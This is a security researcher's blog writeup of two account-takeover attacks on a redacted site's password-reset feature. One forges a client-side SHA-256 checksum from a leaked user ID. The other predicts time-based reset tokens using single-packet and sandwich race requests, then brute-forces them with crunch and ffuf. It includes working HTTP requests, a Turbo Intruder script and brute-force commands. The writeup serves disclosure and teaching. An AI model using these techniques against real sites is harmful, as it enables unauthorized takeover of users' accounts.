---
title: "Defeating custom password reset tokens"
date: 2023-05-16
categories: [Articles & Writeups, Web Hacking]
tags: 
description: This blog post presents a detailed analysis of two successful account takeover scenarios resulting from vulnerabilities in a forgot password implementation. I explore techniques involving anti-tampering token prediction and time-based/sandwich attacks.
toc: true
media_subpath: /assets/img/custom-password-reset-tokens/
image: thumbnail.png
mermaid: true
---

{: .abstract }
>This blog post details two different ways I have used to circumvent the implementation of a flawed forgot password feature and achieve account takeover. The first technique involved using some information disclosed by the server to guess an anti-tampering token to reset any user’s password, while the latter involved the exploitation of a time-based attack together with the sandwich attack to generate some forgot-password tokens and brute-force the victim’s one


# Introduction
As mentioned in the abstract this blog post shows two different techniques I used to attack and defeat a weak forgot password implementation. 

The first technique exploits the fact that the client-side application **signed a parameter used as a checksum** to validate the *content* of requests. Thanks to certain *information disclosed* by the server, it was possible to **arbitrarily calculate each checksum**, thus making it possible to **exploit a weak forgot password function** and **reset the password of any user**.

The second technique instead exploits the *weakness* of the application's generated password *reset tokens*. These tokens are **custom-generated** and are **easily reconstructed**. Since every user can register and create an account on this application, it was possible to use the *single-packet attack* [^single-packet-attack] technique together with the *sandwich attack* [^sandwich-attack] to **generate three tokens at the same** time and through a bit of analysis and brute-force, **obtain the specific token for the victim account**.

[^single-packet-attack]: [The single-packet attack](https://portswigger.net/research/the-single-packet-attack-making-remote-race-conditions-local), portswigger.net

Lets now take a closer look at the two attacks 🔎.

# Breaking weak client-side checksum using disclosed information 

## Forgot password HTTP requests
The target application provided an API used to reset a user’s password when he forgot it. The API was `/services/foo/login/v1/forgotpassword` and accepted a specific JSON body. If the email existed, the server returned the `uid` field of the selected e-mail as a response, sending the relevant password reset e-mail in the meantime:

```http
POST /services/foo/login/v1/forgotpassword HTTP/2
Host: www.redacted.com
Content-Type: application/json

{
    "ldapValRequest":{
        "email":"0xbro-test-1337@yopmail.com",
        "flag":"2",
        "requestData":{
            "clientAppId":"FLTUSEN",
            "dataSizeKey":"681fbb020ca58f49ad1ad41c1689e501253c8493c761ee3eb7046c8c0b7fb216"
        }
    }
}
```

```json
HTTP/2 200 OK
Content-Type: application/json

{
    "ldapValResponse":{
    "errors":[],
    "status":"true",
    "email":"0xbro-test-1337@yopmail.com",
    "uid":"FLTUSENE2407040512811107W"
    }
}
```

Clicking the link arrived by email users were then prompted to insert the new password for their account. At this point, the application validated the token sent by email via the `/services/foo/login/v1/password/validation` API:

```http
POST /services/foo/login/v1/password/validation HTTP/2
Host: www.redacted.com
Content-Type: application/json

{
    "frgtPwdGetQuestionRequest":{
        "token":"FLTUSENO07a43608",
        "requestData":{
            "clientAppId":"FLTUSEN",
            "country":"US",
            "language":"EN",
            "vin":"",
            "dataSizeKey":"7aafb36a4fd657ccedd97c24b2f65eb041b6430e5b28d82071fa41106ec18577"
        }
    }
}
```

```json
HTTP/2 200 OK
Content-Type: application/json

{
    "frgtPwdGetQuestionResponse":{
        "data":{
            "pwdQuestion":"",
            "pwdQuestion2":"",
            "uid":"FLTUSENE2407040512811107W",
            "email":"0xbro-test-1337@yopmail.com"
        },
        "status":"true"
    }
}
```

If the `status` was `true`, the application proceeded to reset the user's password via the `/services/foo/login/v1/password/reset` API:

```http
POST /services/foo/login/v1/password/reset HTTP/2
Host: www.redacted.com
Content-Type: application/json

{
    "rstPasswordRequest": {
        "requestData": {
            "clientAppId": "FLTUSEN",
            "country": "US",
            "language": "EN",
            "uid": "FLTUSENE2407040512811107W",
            "newPassword": "Pwn3dAcc",
            "dataSizeKey": "6c41c41706afbd392d521cee7fbdf805225fc55542f7a6db1ae98be01059c3a1"
        }
    }
}
```

```json
HTTP/2 200 OK
Content-Type: application/json

{"rstPasswordResponse":{"status":"true"}}
```

Taking a closer look at the whole process, we can notice the following issues:
1. The solution never uses tokens generated using a cryptographically safe algorithm
2. The `uid` field required to reset a specific user's password is disclosed before the reset token is validated
3. The `/password/reset` API takes for granted that the password reset token has already been validated since we have a valid `uid` and the token is not included in the request

By combining all these factors, it seems possible to reset a user's password knowing only the e-mail address.

We can see, however, that every request sent to APIs contains a `dataSizeKey` field that seems to serve as an *anti-tampering token*. Theoretically, this field should prevent the possibility of re-sending the same password reset request to a user with a different `uid`. As we can observe, however, this field is __never__ included in server responses, but only ever appears inside HTTP requests, which means that it is *necessarily calculated client-side*. 

But how? 

## Guessing `dataSizeKey`
Taking a look at the javascript file `ForgotPassword.js` used to send the forgot password request, we can see that the `dataSizeKey` field is *calculated using only values known to the user*:

```js
...
var clientAppId = FG.clientAppId;
var dataSizeKey = formvault(clientAppId + emailID + '2');
...
var reqstData = {
    "ldapValRequest": {
    "email": emailID,
    "flag": "2",
    "requestData": {
        "clientAppId": clientAppId,
        "dataSizeKey": dataSizeKey
    }
    }
};
...
```
What about the token sent in the password reset request? 

I have never been good at equations, but if 
```
v1/forgotpassword : ForgotPassword.js = v1/password/reset : X
```
then X should be something like `ResetPassword.js`, right?

Right, and we can see that `dataSizeKey` is calculated in a similar way as before:

```js
var uid = (res.frgtPwdGetQuestionResponse.data.uid) ? res.frgtPwdGetQuestionResponse.data.uid : '';
var reqstData = {
"rstPasswordRequest": {
    "requestData":{
    "clientAppId": FG.clientAppId,
    "country": FG.country,
    "language": FG.language,
    "uid": uid,
    "newPassword": formData['confpassword']
    }
}
};
reqstData.rstPasswordRequest.requestData["dataSizeKey"] = formvault(
    FG.clientAppId + uid + formData['confpassword']
    // sha256("FLTUSEN"+"FLTUSENE2407040512811107W"+"Pwn3dAcc")
    );
```

`uid` is the field we obtain as a result of the request to `v1/forgotpassword`, and the other fields are all known or user-controlled values. 

```sh
$ echo -n 'FLTUSENFLTUSENE2407040512811107WPwn3dAcc' | sha256sum 
6c41c41706afbd392d521cee7fbdf805225fc55542f7a6db1ae98be01059c3a1
```

This means that having a valid user's e-mail address is enough to reset his password.

![]({{page.screenshots}}1.png)
*leaked user uid and reset its password*

![]({{page.screenshots}}2.png)
*logged in on behalf of the user*


# Calculate and brute-force weak tokens with the Sandwich Attack 

## The hot-fix to the previous flaw
Following the first flaw, it was suggested to the development team to modify the password reset mechanism, remove the information returned in server responses, and introduce random tokens generated with cryptographically safe algorithm.

However, they chose to take the easy route by removing the `uid` from the `/forgotpassword` server response, eliminating the `dataSizeKey` field from the entire forgot password mechanism, and replacing the `uid` field with `token` in `/password/reset` without switching to a more robust and random token.

![]({{page.screenshots}}forgotpassword-diff.png)
*forgotpassword request and response comparison*

![]({{page.screenshots}}resetpassword-diff.png)
*password/reset request comparison*


In doing so, it is no longer possible to reset a user's password at will via the `/password/reset` API because you must first find a way to leak the necessary password reset `token`.

## Token analysis

By generating several forgot password emails spread and grouped over several days and times, and analysing the subsequent tokens, we can identify some interesting *common patterns*.

```txt
/reset-password.php?token=FLTUSENh11R22508
/reset-password.php?token=FLTUSENe11H52508
/reset-password.php?token=FLTUSENj11g42508
/reset-password.php?token=FLTUSENz11X01408
/reset-password.php?token=FLTUSENU11N21611
/reset-password.php?token=FLTUSENw11n62910
/reset-password.php?token=FLTUSENL11T53909
```

Tokens are generated following this schema:

```txt
FLTUSEN (undefined letter) (month number) (undefined letter) (undefined number) (minutes) (seconds)
FLTUSEN          h               11                 R                 2             25       08
FLTUSEN          e               11                 H                 5             25       08
FLTUSEN          j               11                 g                 4             25       08
FLTUSEN          z               11                 X                 0             14       08
FLTUSEN          U               11                 N                 2             16       11
FLTUSEN          w               11                 n                 6             29       10
FLTUSEN          L               11                 T                 5             39       09
```

Since tokens are generated with precision *down to the second* (which is quite relaxed), and we can predict most of the token's components, there are *approximately 27.040 combinations* for a single second. This results from having to guess two letters (with unknown case) and one digit (52 × 52 × 10).

Fortunately for us, the server is poorly configured and does not distinguish between upper and lower case letters, thus allowing us to reduce the number of possibilities to 6.760 (26 × 26 × 10).

![]({{page.screenshots}}token-case.png)
*Second token with inverted upper and lower case random letters is still accepted*

## Reducing the time window (single-packet attack)

Having reached this point, the last thing to do is to work out in which exact second the request is processed by the server. Time-based attacks are, obviously, very time-sensitive, so we have to find a way to pinpoint the exact moment when the server calculates the token [^time-sensitive-attacks].

[^time-sensitive-attacks]: [Time-sensitive attacks](https://portswigger.net/web-security/race-conditions#time-sensitive-attacks), portswigger.net

The application server supports HTTP/2, so we can use the single-packet attack [^single-packet-attack] to send two or more requests down the same HTTP connection, obtaining zero latency between them.

My initial assumption was that by sending two requests at the *exact* same time, one with the attacker's email and one with the victim's email, the server would process them at the same time and thus assign the *same exact* token to both requests.


```mermaid
sequenceDiagram
    autonumber
    par h17:39:09
        Client->>+Server: attacker@email.com
        Note over Server: Token is FLTUSENL11T53909
        Client->>Server: victim@email.com
        Note over Server: Token is FLTUSENL11T53909
    end
        create participant attacker@email.com
        Server-->>attacker@email.com: /reset.html?token=FLTUSENL11T53909
        destroy attacker@email.com
        create participant victim@email.com
        Server-->>-victim@email.com: /reset.html?token=FLTUSENL11T53909
        destroy victim@email.com
```

I set up Turbo Intruder [^turbo-intruder] to send 5 HTTP requests within the same connection using the script below and ran the scan:

[^turbo-intruder]: [Turbo Intruder](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988), portswigger.net

```py
def queueRequests(target, wordlists):

    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    # the 'gate' argument withholds part of each request until openGate is invoked
    # if you see a negative timestamp, the server responded before the request was complete
    for i in range(5):
        engine.queue(target.req, gate='race1')

    # once every 'race1' tagged request has been queued
    # invoke engine.openGate() to send them in sync
    engine.openGate('race1')


def handleResponse(req, interesting):
    table.add(req)
```

![]({{page.screenshots}}turbointruder-2.png)
*Sent 5 forgot password requests down the same HTTP/2 connection concurrently*

Unfortunately, the results were different from what was expected:
```
?token=FLTUSEN P 12 Y 1 4709
?token=FLTUSEN g 12 J 7 4709
?token=FLTUSEN V 12 v 7 4709
?token=FLTUSEN e 12 p 3 4709
?token=FLTUSEN B 12 A 8 4709
```

Although all the requests arrived at the server simultaneously, the tokens generated were different. This suggests that the server likely does not support parallel token generation and multi-threading, but processes them sequentially, one at a time. This prevents us from determining the victim's exact token but not from predicting the approximate moment it is generated.

## Sandwich Attack
If we send a request targeting the victim's email between two requests targeting an email under our control, we can use the tokens assigned to the latter as a reference to infer the one assigned to the victim [^sandwich-attack].

```mermaid
sequenceDiagram
    autonumber
    par h13:03:10
        Client->>Server: attacker@email.com
        Client->>Server: victim@email.com
        Client->>Server: attacker@email.com
    end
        Note over Server: attacker token is FLTUSENa11u70310
        create participant attacker@email.com
        Server-->>attacker@email.com: /reset.html?token=FLTUSENa11u70310
        Note over Server: victim token token is ???
        create participant victim@email.com
        Server-->>victim@email.com: /reset.html?token=???
        Note over Server: attacker token is FLTUSENC11I10310
        Server-->>attacker@email.com: /reset.html?token=FLTUSENC11I10310
        destroy attacker@email.com
        destroy victim@email.com
```

Token results:
```text
FLTUSEN a 11 u 7 0310 (attack)
FLTUSEN ? 11 ? ? 0310 (victim)
FLTUSEN C 11 I 1 0310 (attack)
```

Using the two tokens we obtained as a template, we can generate all possible missing combinations using crunch [^crunch] or a Python script:

```sh
$ crunch 16 16 -t FLTUSEN,11,%0310 -o tokens.txt
Crunch will now generate the following amount of data: 114920 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 6760 
FLTUSENA11A00310
FLTUSENA11A10310
FLTUSENA11A20310
FLTUSENA11A30310
FLTUSENA11A40310
FLTUSENA11A50310
FLTUSENA11A60310
FLTUSENA11A70310
FLTUSENA11A80310
FLTUSENA11A90310
...
```

After generating every possible combinations, we can brute-force the `/password/reset` API to identify the user's token and reset the password:

```sh
$ ffuf -u "https://www.redacted.com/host/service/password/reset" -X POST \
-H "Content-Type: application/json" \
-d "{\"rstPasswordRequest\":{\"requestData\":{\"clientAppId\":\"FLTUSEN\",\"country\":\"US\",\"language\":\"EN\",\"token\":\"FUZZ\",\"newPassword\":\"Pwn3dAccount!\"}}}" \
-w tokens.txt \
-fs 81
...
FLTUSENE11L10310        [Status: 200, Size: 41, Words: 7, Lines: 1, Duration: 547ms]
...
```

Depending on the number of attempts made, it could be that the server momentarily blocks the IP performing the bruteforce. If this occurs, it becomes difficult to make the attack reliable because some WAF or protection mechanism may block the attacker before he sends all 6760 combinations.

In this case, increasing the probability of a successful attack is as simple as generating more tokens within the same second the codes are created. Generating more tokens within the 6,760 combination range increases the chances of finding a match, reducing the likelihood of being blocked prematurely.



[^crunch]: [`crunch` - generate wordlists from a character set](https://manpages.ubuntu.com/manpages/focal/man1/crunch.1.html), manpages.ubuntu.com

[^sandwich-attack]: [Sandwich Attacks: From Reset Password to Account Takeover](https://appsec-labs.com/sandwich-attacks/), appsec-labs.com
